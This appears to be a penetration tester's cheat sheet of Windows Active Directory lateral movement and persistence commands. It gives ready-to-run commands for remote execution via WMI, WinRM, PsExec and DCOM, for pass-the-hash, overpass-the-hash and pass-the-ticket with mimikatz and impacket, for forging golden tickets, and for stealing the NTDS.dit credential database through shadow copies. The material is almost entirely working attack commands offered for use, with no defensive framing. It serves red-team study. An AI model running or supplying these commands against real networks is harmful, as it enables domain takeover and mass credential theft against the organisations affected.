Note: These techniques do not have any remote UAC restrictions since they only apply to non-domain jointed machines. This means that in domain-jointed machine the techniques can run with domain user's full privileges. 

* Lateral Movement techniques:
	* WMI and WinRM:
		* Using wmi:
			* wmic: `wmic /node:<ip> /user:<user> /password:<password> process call create "command"`
			* wmi using dcom in powershell:
				* `$Options = New-CimSessionOption -Protocol DCOM`
				* `$Session = New-Cimsession -ComputerName <ip> -Credential <PSCredential object> -SessionOption $Options`
				* `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =<Command>};`
		* WinRM using winrs: `winrs -r:<target> -u:<user> -p:<password> "<command>"`
			* For winrs to work, the domain user must beÂ Administrators or Remote Management Users on the target host. 
		* WinRM using PowerShell remoting: `New-PSSession -ComputerName <ip> -Credential <PSCredential object>`
	- PsExec: `./PsExec64.exe -i  \\<domain> -u <domain>\<user> -p <domain> <command>`
		- The user that authenticates to the target machine needs to be part of the Administrators local group
		- Requires ADMIN$ share and file and printer sharing enabled.
	- Pass the Hash: Use NTLM hash of user to authenticate to wmi or psxec.
		- The user that authenticates to the target machine needs to be part of the Administrators local group
		- Requires ADMIN$ share and file and printer sharing enabled.
		- wmi using impacket on linux: `impacket-wmiexec -hashes :<ntlm hash> <user>@<ip>`
	- Overpass the Hash: Use NTLM hash to request for Kerberos tickets.
		- mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm> /run:<command>`
		- One use case is using Psexec on to authenticate to another host using Kerberos instead of authenticating with a password. 
	- Pass the Ticket: A kereberos ticket can be exported and reinjected into memory of another user session or machine in the network to use the ticket.
		- mimikatz exporting tickets: `sekurlsa::tickets /export`
			- Tickets are stored as `.kirbi` files.
		- Inject ticket into memory: `kerberos::ptt <ticket kirbi file>`
	- DCOM: DCOM's MMC Application Class allows the creation of Application Objects which allows execution of shell commands.
		- Requires local administrator on target machine.
		- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<ip>"))`
		- `$dcom.Document.ActiveView.ExecuteShellCommand("<cmd/powershell>",$null,"<commadn>","7")`
* Persistence techniques:
	- Golden Ticket: Forge a ticket with Kerberos account ntlm hash and use it to access any resource in the domain.
		- Required:
			- krbtgt account ntlm hash.
			- User's domain SID
				- Use `whoami /user` and remove the RID (end part of the SID from command output)
		* mimikatz: `kerberos::golden /user:<user> /domain:<domain> /sid:<domain sid> /krbtgt:<krbtgt ntlm> /ptt`
		* Use `misc:cmd` to open a new terminal with elevated privileges.
	- Shadow Copies: This is a backup technology to save snapshots of file, volumes.
		- Requires domain admin privileges on a domain controller.
		- Goal is to extract AD database NTDS.dit file and SYSTEM hive registry keys and dump it offline on kali attack machine.
		- `vshadow.exe -nw -p  C:`: runs vss and copies shadow volume to C: and note down shadow copy device name.
		- `copy <show copy device name>\windows\ntds\ntds.dit c:\ntds.dit.bak`: copy ntds.dit file to C:
		- `reg.exe save hklm\system c:\system.bak`: export SYSTEM hive registry.
		- On kali attack machine `impacket-secretsdump -ntds <ntds dit file> -system <system hive file> LOCAL`